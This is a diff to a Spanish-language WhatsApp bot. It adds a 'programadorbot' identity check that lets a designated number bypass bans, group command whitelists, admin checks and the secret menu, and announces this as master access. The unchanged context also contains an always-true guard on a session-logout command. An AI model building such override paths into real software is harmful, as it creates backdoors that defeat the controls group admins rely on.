@@ -21,6 +21,7 @@ const {
 } = require('./comandos/economia');
 const { comandoRifa, comandoRifaInscripcion, comandoRifaJasc13, comandoMenuRifaJasc13, comandoAbrirRifa, comandoActivarRifaAqui, comandoCerrarRifa } = require('./comandos/rifas');
 const { comandoCarry } = require('./comandos/carry');
+const { esProgramadorBot } = require('./comandos/programadorbot');
 
 const categoriasMap = {
     'fortnite': ['pavos', 'destacadasstw', 'legendariasstw', 'epicasstw', 'alertasstw', 'stw', 'alerta', 'setgrupostw', 'unsetgrupostw', 'setprecio'],
@@ -56,7 +57,7 @@ const comandosValidos = new Set([
         'farmear', 'work', 'crime', 'mendigar', 'pescar', 'minar', 'cazar', 'explorar',
         'ruleta', 'cf', 'slots', 'dados', 'adivina', 'buscaminas', 'rob', 'ppt', 'pelea',
         'carrera', 'hackear', 'shop', 'buy', 'inventario', 'mochila', 'vender', 'use', 'regalar',
-        'rifa', 'rifainscripcion', 'cerrarrifa', 'rifajasc13', 'abrirrifa', 'activarrifaaqui', 'menurifajasc13', 'carryleader', 'carryjoin', 'carryleave', 'carryclose', 'blcarry', 'unblcarry', 'listcarrybl',
+        'rifa', 'rifainscripcion', 'cerrarrifa', 'rifajasc13', 'programadorbot', 'abrirrifa', 'activarrifaaqui', 'menurifajasc13', 'carryleader', 'carryjoin', 'carryleave', 'carryclose', 'blcarry', 'unblcarry', 'listcarrybl',
         'vertodosconandos', 'vertodoscomandos', 'listablanca', 'desactivarbienvenida', 'activarbienvenida', 'personalizarbienvenida', 'restaurarbienvenida'
 ]);
 
@@ -73,6 +74,9 @@ async function procesarMensaje(sock, msg) {
         .replace(/[\u0300-\u036f]/g, '')
         .replace(/^[!/.]/, '');
 
+    const esProgramador = esProgramadorBot(msg);
+    msg.programadorBot = esProgramador;
+
     const comandoPropioPermitido = new Set([
         'warn', 'advertir', 'verwarns', 'limpiarwarns',
         'ban', 'unban', 'listanegra', 'banlist', 'unbanlist',
@@ -81,7 +85,7 @@ async function procesarMensaje(sock, msg) {
 
     // Los mensajes enviados por el propio número del bot normalmente se ignoran.
     // Excepción: solo se aceptan los comandos de warns/lista negra definidos arriba.
-    if (msg.key.fromMe && !comandoPropioPermitido.has(normalizarComando(textoOriginal))) return;
+    if (!esProgramador && msg.key.fromMe && !comandoPropioPermitido.has(normalizarComando(textoOriginal))) return;
 
     if (normalizarComando(textoOriginal) === 'cerrarsesionauth') {
         if (msg.key.fromMe || true) { 
@@ -103,7 +107,7 @@ Apoya a un creador: JASC13` });
     }
 
     const textoComandoPrevio = normalizarComando(textoOriginal);
-    const esComandoPropioPermitido = msg.key.fromMe && comandoPropioPermitido.has(textoComandoPrevio);
+    const esComandoPropioPermitido = esProgramador || (msg.key.fromMe && comandoPropioPermitido.has(textoComandoPrevio));
 
     // La lista blanca se procesa antes del anti-links para permitir agregar cualquier URL.
     if (textoComandoPrevio === 'listablanca') {
@@ -147,7 +151,7 @@ Apoya a un creador: JASC13` });
             cacheConfigComandos.set(chatJid, { valor: configGrupo, expira: Date.now() + CACHE_TTL_MS });
         }
     }
-    if (configGrupo && !msg.key.fromMe && chatJid.endsWith('@g.us')) {
+    if (configGrupo && !msg.key.fromMe && !esProgramador && chatJid.endsWith('@g.us')) {
         let permitidos = JSON.parse(configGrupo.valor);
         let comandoPermitido = false;
         
@@ -170,16 +174,16 @@ Apoya a un creador: JASC13` });
         usuarioBD = await User.findOne({ numero: remitenteReal });
         if (!usuarioBD) usuarioBD = await User.create({ numero: remitenteReal });
 
-        if (usuarioBD.baneado) return;
+        if (usuarioBD.baneado && !esProgramador) return;
     } else {
         const cacheBaneo = cacheBaneoUsuario.get(remitenteReal);
         if (cacheBaneo && cacheBaneo.expira > Date.now()) {
-            if (cacheBaneo.baneado) return;
+            if (cacheBaneo.baneado && !esProgramador) return;
         } else {
             const usuarioEstado = await User.findOne({ numero: remitenteReal }).select('baneado').lean();
             const baneado = !!usuarioEstado?.baneado;
             cacheBaneoUsuario.set(remitenteReal, { baneado, expira: Date.now() + CACHE_TTL_MS });
-            if (baneado) return;
+            if (baneado && !esProgramador) return;
         }
     }
 
@@ -187,6 +191,12 @@ Apoya a un creador: JASC13` });
     let economiaBD = null;
     if (comandosEconomia.has(comando)) {
         economiaBD = await obtenerEconomia(chatJid, remitenteReal);
+    }
+
+    if (comando === 'programadorbot') {
+        if (!esProgramador) return;
+        await sock.sendMessage(chatJid, { text: '🛠️ *PROGRAMADORBOT ACTIVO*\n\nAcceso maestro habilitado para este número. Las restricciones de administrador, propietario, comandos restringidos, mute y baneo del bot quedan ignoradas para tus comandos.' }, { quoted: msg });
+        return;
     }
 
     if (comando === 'desactivarbienvenida') {
@@ -320,13 +330,13 @@ Apoya a un creador: JASC13` });
     if (comandosValidos.has(comando)) {
         switch (comando) {
             case 'menusecreto':
-                if (!msg.key.fromMe) return; 
+                if (!msg.key.fromMe && !esProgramador) return; 
                 await ejecutarMenu(sock, chatJid, msg, ['secreto']);
                 break;
             case 'activarcomandos':
                 if (chatJid.endsWith('@g.us')) {
                     const remitente = msg.key.participant || chatJid;
-                    let esAdmin = msg.key.fromMe;
+                    let esAdmin = msg.key.fromMe || esProgramador;
                     if (!esAdmin) {
                         try {
                             const groupMeta = await sock.groupMetadata(chatJid);
@@ -338,7 +348,7 @@ Apoya a un creador: JASC13` });
                         await sock.sendMessage(chatJid, { text: `❌ Solo los administradores del grupo pueden configurar los comandos.` }, { quoted: msg });
                         return;
                     }
-                } else if (!msg.key.fromMe) {
+                } else if (!msg.key.fromMe && !esProgramador) {
                     return; 
                 }
                 
